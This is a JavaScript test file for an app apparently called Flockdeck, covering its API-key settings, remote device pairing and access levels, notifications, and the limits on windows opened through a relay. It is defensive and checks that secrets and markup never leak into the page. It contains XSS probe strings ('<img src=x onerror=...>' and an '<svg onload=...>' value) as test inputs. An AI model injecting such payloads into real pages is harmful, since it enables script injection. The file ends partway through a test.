// L5: API keys, Flockdeck Remote (devices and pairing) and notifications. The pure
// parts first, then the store, then each section of the settings through the real
// page on a fake control socket, then the Remote section on its own where a test
// needs to move the clock. A window reached through the relay is held to what the
// desktop allows it.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { render } from "../src/vendor/preact.mjs";
import { html } from "../src/html.js";
import { Live } from "../src/shell/Live.js";
import { Remote } from "../src/shell/Remote.js";
import { canClear, clearKeyCommand, keyNotes, keyStatus, keysOf, setKeyCommand } from "../src/lib/apikeys.js";
import {
  ACCESS, accessIndex, accessOf, addsAccess, nextAccess, ago, daysLeft, deviceCodes, enableCommand, joinLine, leftText, moveCommand, outcomeOf, PAIR_CAP_MS, pairLive, pairOf, planOf, planText, qrSource, renameCommand,
  retryClock, revokeCommand, roleCommand, rosterOf, summaryOf, unverifyCommand, untilText, verifyCommand, viewOf,
} from "../src/lib/remote.js";
import {
  PRESENCE_EVERY_MS, askPermission, delayLabel, noteOf, permissionOf, permissionWords, pushOf, pushPrefs, raise, waitsOf, watchPresence,
} from "../src/lib/attention.js";
import { prefsOf, setting, settledPending, addPending } from "../src/lib/prefs.js";
import { createDom, install, settle } from "./dom.mjs";
import { FakeWebSocket, harness, hello } from "./fakes.mjs";
import { PtySocket, FakeTerm, FakeFit, FakeObserver } from "./termfakes.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const fixtureFile = join(here, "..", "..", "internal", "server", "testdata", "graph-fixtures", "01-six-helpers-one-permission.json");
const MARKUP = '<img src=x onerror="alert(1)">';

// ---------------------------------------------------------------- pure parts

test("api keys: rows are read defensively and say where a key came from, never what it is", () => {
  const rows = keysOf({
    items: [
      { agent: "claude", name: "Claude", set: true, source: "env", env: "ANTHROPIC_API_KEY", stored: true, key: "sk-secret" },
      { agent: "aider", name: "", set: false, vars: ["OPENAI_API_KEY", 7, "ANTHROPIC_API_KEY"] },
      { agent: "ollama", set: false, notNeeded: true },
      { agent: "stored", set: true, source: "store", stored: true },
      { name: "no id" }, null, "text", { agent: 4 },
    ],
  });
  assert.deepEqual(rows.map((r) => r.agent), ["claude", "aider", "ollama", "stored"]);
  assert.equal(JSON.stringify(rows).includes("sk-secret"), false, "a field the desktop should never send is not carried");
  assert.equal(keyStatus(rows[0]), "set via ANTHROPIC_API_KEY");
  assert.deepEqual(keyNotes(rows[0]), ["a stored key is kept as well"]);
  assert.equal(rows[1].name, "aider", "a missing name is the id");
  assert.equal(keyStatus(rows[1]), "not set");
  assert.deepEqual(keyNotes(rows[1]), ["or export OPENAI_API_KEY or ANTHROPIC_API_KEY"]);
  assert.equal(keyStatus(rows[2]), "needs no key");
  assert.equal(keyStatus(rows[3]), "set, stored by Flockdeck");
  assert.deepEqual(rows.map(canClear), [true, false, false, true], "a key from the environment is not unset here, a stored one a variable shadows is");
  assert.deepEqual(keysOf(null), []);
  assert.deepEqual(keysOf({ items: "no" }), []);
});

test("api keys: a key is trimmed, an empty one is not sent", () => {
  assert.deepEqual(setKeyCommand("claude", "  sk-1 \n"), { cmd: "keySet", id: "claude", text: "sk-1" });
  assert.equal(setKeyCommand("claude", "   "), null);
  assert.equal(setKeyCommand("", "x"), null);
  assert.equal(setKeyCommand("claude", undefined), null);
  assert.deepEqual(clearKeyCommand("claude"), { cmd: "keyClear", id: "claude" });
  assert.equal(clearKeyCommand(""), null);
});

test("remote: the tunnel is summarised in words, and a retry is a clock time that never claims a moment past", () => {
  const at = Date.parse("2026-10-24T12:00:00Z");
  const v = (o) => viewOf({ relay: "https://remote.flockdeck.ai", ...o });
  assert.equal(viewOf(null), null);
  assert.equal(viewOf("x"), null);
  assert.equal(summaryOf(v({ state: "connected", viewers: 2 }), at), "Reachable through remote.flockdeck.ai \u2014 2 windows are open from another device");
  assert.equal(summaryOf(v({ state: "connected", viewers: 1 }), at), "Reachable through remote.flockdeck.ai \u2014 1 window is open from another device");
  assert.equal(summaryOf(v({ state: "connected" }), at), "Reachable through remote.flockdeck.ai");
  assert.equal(summaryOf(v({ state: "connecting" }), at), "Connecting to remote.flockdeck.ai\u2026");
  assert.match(summaryOf(v({ state: "error", detail: "no route", retryAt: new Date(at + 5000).toISOString() }), at), /^Cannot reach remote\.flockdeck\.ai: no route\. Trying again at \d\d:\d\d:\d\d\.$/);
  assert.equal(retryClock(new Date(at - 1).toISOString(), at), " Trying again shortly.");
  assert.equal(retryClock("", at), "");
  assert.equal(retryClock("not a time", at), "");
  assert.match(summaryOf(v({ state: "disabled" }), at), /^Flockdeck Remote is off on this machine\. Its account is kept/);
  assert.equal(summaryOf(v({ state: "lapsed", detail: "Your plan ended." }), at), "Your plan ended.");
  assert.equal(summaryOf(v({ state: "lapsed" }), at), "The relay has stopped Flockdeck Remote for this account.");
  assert.equal(summaryOf(v({ state: "weird" }), at), "Not connected to remote.flockdeck.ai.");
});

test("remote: the roster is read defensively, and codes and access come from what the desktop sent", () => {
  const ro = rosterOf({
    enabled: true, current: "d2",
    devices: [
      { id: "d1", name: "Phone", created: "2026-10-01T00:00:00Z", lastSeen: "2026-10-24T11:59:00Z", fingerprint: "AB12", verify: "verified", role: "viewer", watchPanes: true },
      { id: "d2", name: 5, deskFingerprint: "CD34", deskVerify: "changed" },
      { name: "no id" }, null, { id: "" },
    ],
    hosts: [{ id: "h1", name: "Desk", online: true, self: true }, null, { id: 3 }],
    plan: { plan: "trial", name: "Free trial", active: true, ends: "2026-11-01T00:00:00Z" },
  });
  assert.deepEqual(ro.devices.map((d) => d.id), ["d1", "d2"]);
  assert.equal(ro.devices[1].name, "", "a name that is not text is empty");
  assert.deepEqual(deviceCodes(ro.devices[0]).map((k) => [k.origin, k.code, k.state]), [["usual", "AB12", "verified"]]);
  assert.deepEqual(deviceCodes(ro.devices[1]).map((k) => [k.origin, k.state]), [["desk", "changed"]]);
  assert.equal(ACCESS[accessIndex(ro.devices[0])].label, "View artifacts and watch panes");
  assert.equal(ACCESS[accessIndex(ro.devices[1])].label, "Full access");
  assert.equal(accessIndex({ role: "unknown", watchPanes: false }), -1, "a role that is not known is none of the levels");
  assert.equal(accessOf({ role: "unknown", watchPanes: false }).label, "Unknown");
  assert.equal(nextAccess({ role: "unknown", watchPanes: false }), null, "nothing is stepped to from it");
  assert.equal(accessOf({ role: "full", watchPanes: true }).label, "Full access", "a full device is full whatever its watch flag says");
  assert.deepEqual(ACCESS.map((l) => nextAccess({ role: l.role, watchPanes: l.watch }).label), ["View artifacts only", "View artifacts and watch panes", "Full access"]);
  assert.deepEqual([[0, 1], [1, 2], [2, 0]].map(([a, b]) => addsAccess(ACCESS[a], ACCESS[b])), [false, true, true], "stepping from full takes access away; the other two add it");
  assert.equal(rosterOf({ devices: [{ id: "x", role: "owner" }, { id: "y" }] }).devices.map((d) => accessOf(d).label).join(), "Unknown,Full access");
  assert.equal(ro.hosts.length, 2);
  assert.equal(rosterOf(undefined).enabled, false);
  assert.deepEqual(rosterOf({ devices: "x", hosts: 4 }).devices, []);
  const now = Date.parse("2026-10-24T12:00:00Z");
  assert.equal(ago("2026-10-24T11:59:30Z", now), "just now");
  assert.equal(ago("2026-10-24T11:57:00Z", now), "3 minutes ago");
  assert.equal(ago("2026-10-24T05:00:00Z", now), "7 hours ago");
  assert.equal(ago("2026-10-20T12:00:00Z", now), "4 days ago");
  assert.equal(ago("0001-01-01T00:00:00Z", now), "never", "Go's zero time");
  assert.equal(ago("", now), "never");
  assert.equal(daysLeft("2026-10-26T01:00:00Z", now), 2, "a part of a day counts as one");
  assert.equal(planText(planOf({ plan: "trial", name: "Free trial", active: true, ends: "2026-10-26T12:00:00Z" }), now), "Free trial: 2 days left, until 26 October 2026.");
  assert.match(planText(planOf({ active: false, message: "Ended.", deleteAt: "2026-12-01T00:00:00Z" }), now), /^Ended\. The account and its paired devices are kept until 1 December 2026, then deleted\.$/);
  assert.equal(planOf(null), null);
});

test("remote: a pairing link is live until it expires, and says how long it has", () => {
  const now = Date.parse("2026-10-24T12:00:00Z");
  const p = pairOf({ kind: "device", url: "https://x/p/1", code: "123", expiresAt: new Date(now + 125000).toISOString(), qr: "<svg/>", extra: 1 });
  assert.equal(pairLive(p, now), true);
  assert.equal(pairLive(p, now + 125000), false, "at the moment it ends");
  assert.equal(pairLive({ ...p, expiresAt: "" }, now), true, "no expiry is taken as live");
  assert.equal(pairLive({ ...p, url: "", code: "" }, now), false);
  assert.equal(pairLive(null, now), false);
  assert.equal(leftText(p.expiresAt, now), "2 minutes 5 seconds left");
  assert.equal(leftText(p.expiresAt, now + 64000), "1 minute 1 second left");
  assert.equal(leftText(p.expiresAt, now + 124001), "1 second left");
  assert.equal(leftText(p.expiresAt, now + 130000), "expired");
  assert.equal(leftText(new Date(now + 120000).toISOString(), now), "2 minutes left", "no seconds to add");
  assert.equal(leftText("", now), "");
  assert.match(untilText(p.expiresAt), /^, until \d\d:\d\d$/);
  assert.equal(untilText(""), "");
  assert.equal(pairOf({ kind: "host" }).kind, "host");
  assert.equal(pairOf({ kind: "other" }).kind, "device");
  assert.equal(pairOf(null).url, "");
  assert.equal(qrSource(""), "");
  assert.equal(qrSource('<svg onload="x"/>'), "data:image/svg+xml;charset=utf-8," + encodeURIComponent('<svg onload="x"/>'), "only ever an image's source");
  assert.deepEqual(outcomeOf({ action: "move", error: "bad", untold: true, warning: "w", junk: 1 }), { action: "move", error: "bad", untold: true, warning: "w" });
  assert.deepEqual(outcomeOf(null), { action: "", error: "", untold: false, warning: "" });
});

test("remote: the commands carry what the desktop reads, and refuse what it would", () => {
  assert.deepEqual(enableCommand({ relay: " https://r ", name: " Desk ", join: "J", invite: "I", more: false }), { cmd: "remoteEnable", relay: "https://r", name: "Desk", join: "", invite: "" }, "folded-away codes are not sent");
  assert.deepEqual(enableCommand({ relay: "", name: "", join: " J ", invite: " I ", more: true }), { cmd: "remoteEnable", relay: "", name: "", join: "J", invite: "I" });
  assert.equal(moveCommand({ relay: "  ", invite: "", join: "" }), null);
  assert.deepEqual(moveCommand({ relay: " https://new ", invite: " I ", join: "" }), { cmd: "remoteMove", relay: "https://new", invite: "I", join: "" });
  assert.deepEqual(renameCommand("host", "", " New "), { cmd: "remoteRename", kind: "host", name: "New" });
  assert.deepEqual(renameCommand("device", "d1", "Phone"), { cmd: "remoteRename", kind: "device", id: "d1", name: "Phone" });
  assert.equal(renameCommand("device", "", "x"), null);
  assert.deepEqual(revokeCommand("d1"), { cmd: "remoteRevoke", id: "d1" });
  assert.equal(revokeCommand(""), null);
  assert.deepEqual(verifyCommand("d1", "desk", "AB12"), { cmd: "remoteVerify", id: "d1", kind: "desk", text: "AB12" });
  assert.equal(verifyCommand("d1", "usual", ""), null);
  assert.deepEqual(unverifyCommand("d1", "usual"), { cmd: "remoteUnverify", id: "d1", kind: "usual" });
  assert.deepEqual(roleCommand("d1", ACCESS[2]), { cmd: "setDeviceRole", id: "d1", kind: "viewer", watch: true });
  assert.equal(roleCommand("", ACCESS[0]), null);
});

test("notifications: the push settings read within bounds, are kept as the desktop keeps them, and round-trip", () => {
  assert.deepEqual(pushOf(undefined), { off: false, anonymous: false, delaySeconds: 30 });
  assert.equal(pushOf({ delaySeconds: 4 }).delaySeconds, 30, "below the least");
  assert.equal(pushOf({ delaySeconds: 3601 }).delaySeconds, 30, "above the most");
  assert.equal(pushOf({ delaySeconds: 90.5 }).delaySeconds, 30);
  assert.equal(pushOf({ delaySeconds: 600 }).delaySeconds, 600);
  assert.equal(pushPrefs({ off: false, anonymous: false, delaySeconds: 30 }), null, "all defaults is left out");
  assert.deepEqual(pushPrefs({ off: true, anonymous: false, delaySeconds: 60 }), { off: true, delaySeconds: 60 });
  assert.equal(delayLabel(60), "1 minute");
  assert.equal(delayLabel(45), "45 seconds");
  const cases = [
    ["notificationsOff", true, { cmd: "notifications", kind: "off" }, { notificationsOff: true }, (p) => p.notificationsOff === true],
    ["notificationsOff", false, { cmd: "notifications", kind: "on" }, { notificationsOff: false }, (p) => p.notificationsOff === false],
    ["pushOff", true, { cmd: "pushNotify", kind: "off" }, { push: { off: true } }, (p) => p.push.off === true],
    ["pushOff", false, { cmd: "pushNotify", kind: "on" }, { push: null }, (p) => p.push.off === false],
    ["pushAnonymous", true, { cmd: "pushAnonymous", kind: "on" }, { push: { anonymous: true } }, (p) => p.push.anonymous === true],
    ["pushDelay", 120, { cmd: "pushDelay", size: 120 }, { push: { delaySeconds: 120 } }, (p) => p.push.delaySeconds === 120],
    ["pushDelay", 30, { cmd: "pushDelay", size: 30 }, { push: null }, (p) => p.push.delaySeconds === 30],
  ];
  for (const [name, value, command, patch, read] of cases) {
    const s = setting(name, value, {});
    assert.deepEqual(s.command, command, name);
    assert.deepEqual(s.patch, patch, name);
    assert.ok(read(prefsOf({ ...s.patch })), name);
  }
  assert.equal(setting("pushDelay", 4, {}), null);
  assert.equal(setting("pushDelay", 3601, {}), null);
  assert.equal(setting("pushDelay", 12.5, {}), null);
  // A change keeps what is already set: turning anonymous on leaves the delay.
  assert.deepEqual(setting("pushAnonymous", true, { push: { delaySeconds: 120 } }).patch, { push: { anonymous: true, delaySeconds: 120 } });
  // The desktop leaves an all-default push out, and that answers a patch of null.
  const waiting = addPending({}, { push: null });
  assert.deepEqual(settledPending(waiting, {}, { push: { off: true } }), {}, "the desktop's push without a push settles the change");
});

test("notifications: only a pane that newly needs you is announced, and the words carry nothing it asked", () => {
  const first = waitsOf(new Map(), { a: { name: "A", status: "waiting" }, b: { name: "B", status: "working" } });
  assert.deepEqual(first.fresh, [], "arriving where an agent already waits is not news");
  const next = waitsOf(first.next, { a: { name: "A", status: "waiting" }, b: { name: "B", status: "waiting", branch: "feat/x" }, c: { name: "C", status: "blocked" } });
  assert.deepEqual(next.fresh.map((f) => f.id), ["b"], "a pane first seen waiting is not fresh; a that was already waiting is not either");
  const later = waitsOf(next.next, { a: { name: "A", status: "working" }, b: { status: "waiting" }, c: { name: "C", status: "blocked" } });
  assert.deepEqual(later.fresh, []);
  const again = waitsOf(later.next, { a: { name: "A", status: "blocked" } });
  assert.deepEqual(again.fresh.map((f) => [f.id, f.blocked]), [["a", true]]);
  assert.deepEqual(waitsOf(new Map(), null).fresh, []);
  assert.deepEqual(noteOf([{ id: "b", name: "B", branch: "feat/x", blocked: false }]), { title: "B needs you", body: "feat/x \u2014 waiting for input", paneId: "b" });
  assert.equal(noteOf([{ id: "b", name: "B", branch: "", blocked: true }]).body, "a tool call was blocked");
  assert.deepEqual(noteOf([{ id: "a", name: "A" }, { id: "b", name: "B" }]), { title: "2 agents need you", body: "A, B", paneId: "a" });
});

test("notifications: the browser's leave is read, asked for once, and a notification is raised only when granted", async () => {
  assert.equal(permissionOf(null), "unsupported");
  assert.equal(permissionOf({}), "unsupported");
  assert.equal(permissionOf({ Notification: { permission: "granted" } }), "granted");
  assert.equal(permissionOf({ Notification: { permission: "denied" } }), "denied");
  assert.equal(permissionOf({ Notification: { permission: "weird" } }), "default");
  assert.match(permissionWords("denied"), /blocked them for this window/);
  assert.match(permissionWords("unsupported"), /does not offer them/);
  assert.equal(permissionWords("granted"), "");
  const made = [];
  class N {
    constructor(title, opts) { made.push([title, opts]); this.closed = false; }
    close() { this.closed = true; }
    static permission = "default";
    static requested = 0;
    static requestPermission() { N.requested++; N.permission = "granted"; return Promise.resolve("granted"); }
  }
  const win = { Notification: N, focus() { win.focused = true; } };
  assert.equal(raise(win, { title: "t", body: "b", paneId: "p" }, () => {}), null, "not before the leave is given");
  assert.equal(await askPermission(win), "granted");
  assert.equal(await askPermission(win), "granted");
  assert.equal(N.requested, 1, "asked once");
  const clicked = [];
  const n = raise(win, { title: "t", body: "b", paneId: "p" }, (id) => clicked.push(id));
  assert.deepEqual(made[0], ["t", { body: "b", tag: "flockdeck", renotify: true }]);
  n.onclick();
  assert.deepEqual(clicked, ["p"]);
  assert.equal(win.focused, true);
  assert.equal(n.closed, true);
});

test("presence: real input is reported at most every half minute, and a window with no document reports nothing", () => {
  const listeners = {};
  const doc = {
    addEventListener(type, fn, capture) { (listeners[type] ||= []).push([fn, capture]); },
    removeEventListener(type, fn) { listeners[type] = (listeners[type] || []).filter(([f]) => f !== fn); },
  };
  const sent = [];
  let t = 1000;
  const stop = watchPresence({ document: doc }, (c) => sent.push(c), () => t);
  assert.deepEqual(Object.keys(listeners).sort(), ["keydown", "pointerdown", "pointermove", "wheel"]);
  assert.ok(Object.values(listeners).every((l) => l[0][1] === true), "heard before the page's own handlers");
  listeners.keydown[0][0]();
  listeners.pointerdown[0][0]();
  assert.deepEqual(sent, [{ cmd: "presence", kind: "used" }], "twice in a moment is one report");
  t += PRESENCE_EVERY_MS - 1;
  listeners.wheel[0][0]();
  assert.equal(sent.length, 1);
  t += 1;
  listeners.wheel[0][0]();
  assert.equal(sent.length, 2);
  t += 5;
  listeners.pointermove[0][0]();
  listeners.pointermove[0][0]();
  assert.equal(sent.length, 2, "a pointer that moves is thinned out and then held to the half minute");
  stop();
  assert.ok(Object.values(listeners).every((l) => l.length === 0));
  const none = watchPresence({}, () => assert.fail("nothing to watch"));
  none();
  assert.equal(JSON.stringify(sent).includes("key\":"), false, "nothing of what was typed goes with it");
});

// ---------------------------------------------------------------- the store

test("the store keeps the keys, roster, pairing link and outcome, numbered, and a remote window sends only what the desktop allows it", async () => {
  const { store } = await harness();
  store.start();
  const ws = FakeWebSocket.last;
  ws.open();
  ws.frame(hello({}));
  ws.frame({ type: "keys", items: [{ agent: "claude", set: true }] });
  ws.frame({ type: "keys", items: [] });
  ws.frame({ type: "remoteDevices", enabled: true, devices: [] });
  ws.frame({ type: "remotePair", kind: "device", url: "https://x" });
  ws.frame({ type: "remoteOutcome", action: "enable" });
  const s = store.getState();
  assert.equal(s.keys.seq, 2);
  assert.deepEqual(s.keys.items, []);
  assert.equal(s.remoteDevices.enabled, true);
  assert.equal(s.remotePair.url, "https://x");
  assert.equal(s.remoteOutcome.action, "enable");
  const deskAll = [
    { cmd: "keySet", id: "claude", text: "k" }, { cmd: "keyClear", id: "claude" }, { cmd: "remoteEnable" }, { cmd: "remoteDisable" }, { cmd: "remoteRemove" },
    { cmd: "remoteMove", relay: "r" }, { cmd: "remoteVerify", id: "d" }, { cmd: "remoteUnverify", id: "d" }, { cmd: "setDeviceRole", id: "d", kind: "viewer" },
    { cmd: "remotePair", kind: "host" },
  ];
  ws.sent.length = 0;
  for (const c of deskAll) assert.equal(store.send(c), true, c.cmd + " goes from the desk");
  store.stop();

  const { store: rs } = await harness();
  rs.start();
  const rws = FakeWebSocket.last;
  rws.open();
  assert.equal(rs.send({ cmd: "keySet", id: "claude", text: "k" }), false, "not before the hello says what this window is");
  rws.frame(hello({ remote: true }));
  rws.sent.length = 0;
  for (const c of deskAll) assert.equal(rs.send(c), false, c.cmd + " is not sent from a relay window");
  const allowed = [{ cmd: "keys" }, { cmd: "remoteDevices" }, { cmd: "remotePair", kind: "device" }, { cmd: "remoteRename", kind: "device", id: "d", name: "x" }, { cmd: "remoteRevoke", id: "d" }, { cmd: "remoteReconnect" }, { cmd: "notifications", kind: "off" }, { cmd: "pushDelay", size: 60 }];
  for (const c of allowed) assert.equal(rs.send(c), true, c.cmd + " is for a relay window too");
  assert.deepEqual(rws.sent.map((x) => (typeof x === "string" ? JSON.parse(x) : x).cmd), allowed.map((c) => c.cmd));
  rs.stop();
});

// ---------------------------------------------------------------- the page

const KEYS = [
  { id: "settings", keys: "Ctrl+,", label: "Settings", section: "The window" },
  { id: "apiKeys", keys: "Ctrl+Shift+A", label: "API keys", section: "The window" },
  { id: "remote", keys: "Ctrl+Shift+E", label: "Flockdeck Remote", section: "The window" },
];
const graph = () => ({ ...JSON.parse(readFileSync(fixtureFile, "utf8")), root: "/work/a" });
const projects = [{ root: "/work/a", name: "alpha", waiting: 0, working: 0 }];
const stateOf = (g, extra = {}) => ({
  type: "state", root: "/work/a", projects, agents: { items: [], roles: [], default: {} }, activeTab: "", tabs: [],
  panes: Object.fromEntries(g.nodes.map((n) => [n.pane, { id: n.pane, name: n.name, structured: n.kind === "structured", status: "working" }])),
  ...extra,
});

async function mount({ prefs = {}, helloOver = {}, extra = {}, win = {} } = {}) {
  PtySocket.reset();
  FakeTerm.reset();
  FakeObserver.instances.length = 0;
  const dom = createDom();
  Object.assign(dom.window, win);
  const restore = install(dom);
  const copied = [];
  dom.window.navigator = { clipboard: { writeText: async (t) => { copied.push(t); } } };
  const { store } = await harness();
  const container = dom.document.createElement("div");
  dom.body.appendChild(container);
  store.start();
  const terminalOptions = {
    Terminal: FakeTerm, FitAddon: FakeFit, ResizeObserver: FakeObserver, WebSocket: PtySocket,
    location: { href: "http://127.0.0.1:5000/", pathname: "/", protocol: "http:" }, isFocused: () => false,
  };
  render(html`<${Live} store=${store} window=${dom.window} terminalOptions=${terminalOptions} />`, container);
  await settle();
  const ws = () => FakeWebSocket.last;
  const g = graph();
  const m = {
    dom, store, container, ws, copied,
    sent: (cmd) => ws().commands(cmd),
    clear: () => { ws().sent.length = 0; },
    push: async (msg) => { ws().frame(msg); await settle(); },
    click: async (el) => { assert.ok(el, "no element to click"); el.click(); await settle(); },
    key: async (spec) => {
      const parts = spec.split("+");
      dom.window.dispatch("keydown", { key: parts[parts.length - 1], ctrlKey: parts.includes("Ctrl"), shiftKey: parts.includes("Shift"), altKey: false });
      await settle();
    },
    connect: async () => {
      ws().open();
      ws().frame(hello({ keys: KEYS, prefs, ...helloOver }));
      await settle();
      ws().frame(stateOf(g, extra));
      await settle();
      if (!helloOver.remote) {
        ws().frame(g);
        await settle();
      }
    },
    openSettings: async (section) => {
      await m.click(container.find(".rail-settings"));
      assert.ok(container.find(".settings-panel"), "the dialog did not open");
      if (section) await m.click(container.findAll(".settings-tab").find((b) => b.attributes["data-section"] === section));
    },
    byText: (sel, re) => {
      const [outer, inner] = sel.split(" ");
      const scope = inner ? container.find(outer) : container;
      return scope ? scope.findAll(inner || outer).find((e) => re.test(e.textContent)) : undefined;
    },
    text: () => (container.find(".settings-panel") ? container.find(".settings-panel").textContent : ""),
    done: () => { render(null, container); store.stop(); restore(); },
  };
  return m;
}

async function withPage(opts, fn) {
  const m = await mount(opts);
  try {
    await fn(m);
  } finally {
    m.done();
  }
}

const on = (el) => el.attributes["aria-checked"] === "true";
const valueIn = (el) => (el.value !== undefined ? el.value : el.attributes.value);
const isDisabled = (el) => !!el.disabled || el.attributes.disabled !== undefined;
const KEY_LIST = {
  type: "keys",
  items: [
    { agent: "claude", name: "Claude", set: true, source: "env", env: "ANTHROPIC_API_KEY", stored: true },
    { agent: "aider", name: "Aider", set: false, vars: ["OPENAI_API_KEY"] },
    { agent: "local", name: "Local model", set: true, source: "store", stored: true },
    { agent: "ollama", name: "Ollama", set: false, notNeeded: true },
  ],
};

test("API keys: the key opens the section, the list is asked for, and a row says only where its key came from", () =>
  withPage({}, async (m) => {
    await m.connect();
    await m.key("Ctrl+Shift+A");
    assert.ok(m.container.find(".settings-panel"));
    assert.equal(m.container.findAll(".settings-tab").find((t) => t.attributes.class.includes("is-active")).attributes["data-section"], "keys");
    assert.deepEqual(m.sent("keys"), [{ cmd: "keys" }]);
    assert.match(m.text(), /Loading/);
    await m.push({ ...KEY_LIST, items: KEY_LIST.items.map((k) => ({ ...k, key: "sk-never-shown" })) });
    const rows = m.container.findAll(".key-row");
    assert.deepEqual(rows.map((r) => r.attributes["data-key"]), ["claude", "aider", "local", "ollama"]);
    assert.match(rows[0].textContent, /set via ANTHROPIC_API_KEY/);
    assert.match(rows[0].textContent, /a stored key is kept as well/);
    assert.match(rows[1].textContent, /not set/);
    assert.match(rows[1].textContent, /or export OPENAI_API_KEY/);
    assert.match(rows[3].textContent, /needs no key/);
    assert.equal(m.text().includes("sk-never-shown"), false);
    const buttons = (r) => r.findAll("button").map((b) => b.textContent);
    assert.deepEqual(buttons(rows[0]), ["Replace\u2026", "Clear"], "a stored key shadowed by a variable can still be cleared");
    assert.deepEqual(buttons(rows[1]), ["Set\u2026"]);
    assert.deepEqual(buttons(rows[2]), ["Replace\u2026", "Clear"]);
    assert.deepEqual(buttons(rows[3]), [], "an agent with no key to set has no button");
  }));

test("API keys: a key is typed in a password field that starts empty, is sent trimmed, and is gone from the page", () =>
  withPage({}, async (m) => {
    await m.connect();
    await m.openSettings("keys");
    await m.push(KEY_LIST);
    await m.click(m.container.find("#key-set-aider"));
    const field = m.container.find("#key-field");
    assert.equal(field.attributes.type, "password");
    assert.equal(m.dom.document.activeElement, field, "the field takes the keyboard");
    m.clear();
    field.value = "  sk-typed  ";
    field.keydown("Enter");
    await settle();
    assert.deepEqual(m.sent("keySet"), [{ cmd: "keySet", id: "aider", text: "sk-typed" }]);
    assert.equal(field.value, "", "emptied the moment it was sent");
    assert.equal(m.container.find("#key-field"), null);
    assert.equal(m.dom.document.activeElement, m.container.find("#key-set-aider"), "the keyboard goes back to the row's button");
    assert.equal(m.text().includes("sk-typed"), false);
    // The desktop says it saved one and sends the list again.
    await m.push({ type: "notice", text: "Saved the key for aider" });
    assert.match(m.container.find("#keys-news").textContent, /Saved the key for aider/);
    // An empty key sends nothing.
    await m.click(m.container.find("#key-set-aider"));
    m.clear();
    m.container.find("#key-field").value = "   ";
    await m.click(m.container.find("#key-save"));
    assert.deepEqual(m.sent("keySet"), []);
  }));

test("API keys: Escape puts the field away without closing the dialog or sending what was typed", () =>
  withPage({}, async (m) => {
    await m.connect();
    await m.openSettings("keys");
    await m.push(KEY_LIST);
    await m.click(m.container.find("#key-set-aider"));
    m.clear();
    const field = m.container.find("#key-field");
    field.value = "half-typed";
    const ev = field.keydown("Escape");
    await settle();
    assert.equal(ev.defaultPrevented, true);
    assert.equal(m.container.find("#key-field"), null);
    assert.ok(m.container.find(".settings-panel"), "the dialog stayed open");
    assert.deepEqual(m.sent("keySet"), []);
    assert.equal(field.value, "");
  }));

test("API keys: Clear asks first and says what stays, and only then sends", () =>
  withPage({}, async (m) => {
    await m.connect();
    await m.openSettings("keys");
    await m.push(KEY_LIST);
    m.clear();
    await m.click(m.container.findAll(".key-row")[0].findAll("button").find((b) => b.textContent === "Clear"));
    const ask = m.container.find(".confirm");
    assert.match(ask.textContent, /Clear the stored key for Claude\?/);
    assert.match(ask.textContent, /not touched, and goes on being used/, "a variable is left alone");
    assert.deepEqual(m.sent("keyClear"), []);
    await m.click(m.byText(".confirm button", /Cancel/));
    assert.equal(m.container.find(".confirm"), null);
    assert.deepEqual(m.sent("keyClear"), []);
    await m.click(m.container.findAll(".key-row")[2].findAll("button").find((b) => b.textContent === "Clear"));
    await m.click(m.byText(".confirm button", /Clear the key/));
    assert.deepEqual(m.sent("keyClear"), [{ cmd: "keyClear", id: "local" }]);
  }));

test("API keys: names from the catalogue are text", () =>
  withPage({}, async (m) => {
    await m.connect();
    await m.openSettings("keys");
    await m.push({ type: "keys", items: [{ agent: "x", name: MARKUP, set: false, vars: [MARKUP] }] });
    assert.equal(m.container.findAll("img").length, 0);
    assert.ok(m.text().includes(MARKUP));
  }));

test("API keys: a relay window sees the rows, is told keys are set on the machine, and cannot send one", () =>
  withPage({ helloOver: { remote: true } }, async (m) => {
    await m.connect();
    await m.openSettings("keys");
    assert.deepEqual(m.sent("keys"), [{ cmd: "keys" }], "listing them is allowed");
    await m.push(KEY_LIST);
    assert.equal(m.container.findAll(".key-row").length, 4);
    assert.equal(m.container.findAll(".key-actions").length, 0, "no Set or Clear");
    assert.match(m.container.find("#keys-relay").textContent, /set and cleared on the machine Flockdeck runs on/);
    assert.equal(m.store.send({ cmd: "keySet", id: "aider", text: "k" }), false);
    assert.equal(m.store.send({ cmd: "keyClear", id: "claude" }), false);
    assert.deepEqual(m.sent("keySet"), []);
  }));

// --- Notifications

test("Notifications: each switch sends its command and shows at once, and the delay follows the push switch", () =>
  withPage({}, async (m) => {
    await m.connect();
    await m.openSettings("notifications");
    assert.equal(on(m.container.find("#set-notifications-switch")), true);
    assert.equal(on(m.container.find("#set-push-switch")), true);
    assert.equal(on(m.container.find("#set-push-anonymous-switch")), false);
    assert.equal(valueIn(m.container.find("#set-push-delay-list")), "30");
    m.clear();
    await m.click(m.container.find("#set-notifications-switch"));
    assert.deepEqual(m.sent("notifications"), [{ cmd: "notifications", kind: "off" }]);
    assert.equal(on(m.container.find("#set-notifications-switch")), false, "shown before the desktop answers");
    await m.click(m.container.find("#set-push-anonymous-switch"));
    assert.deepEqual(m.sent("pushAnonymous"), [{ cmd: "pushAnonymous", kind: "on" }]);
    assert.equal(on(m.container.find("#set-push-anonymous-switch")), true);
    const list = m.container.find("#set-push-delay-list");
    list.value = "120";
    list.dispatch("change");
    await settle();
    assert.deepEqual(m.sent("pushDelay"), [{ cmd: "pushDelay", size: 120 }]);
    await m.click(m.container.find("#set-push-switch"));
    assert.deepEqual(m.sent("pushNotify"), [{ cmd: "pushNotify", kind: "off" }]);
    assert.equal(isDisabled(m.container.find("#set-push-delay-list")), true, "no delay to choose while nobody is told");
    // The desktop keeps the push as one object, and the window follows its push.
    await m.push({ type: "prefs", prefs: { notificationsOff: true, push: { off: true, anonymous: true, delaySeconds: 120 } } });
    assert.equal(on(m.container.find("#set-push-switch")), false);
    assert.equal(on(m.container.find("#set-push-anonymous-switch")), true);
    assert.equal(valueIn(m.container.find("#set-push-delay-list")), "120");
  }));

test("Notifications: an odd delay the desktop holds is still listed, and the machine's name and a failed push are text", () =>
  withPage({ prefs: { push: { delaySeconds: 45 } }, extra: { remote: { state: "connected", relay: "https://r", name: MARKUP, pushError: MARKUP, viewers: 0 } } }, async (m) => {
    await m.connect();
    await m.openSettings("notifications");
    const opts = m.container.find("#set-push-delay-list").findAll("option").map((o) => o.textContent);
    assert.ok(opts.includes("45 seconds"));
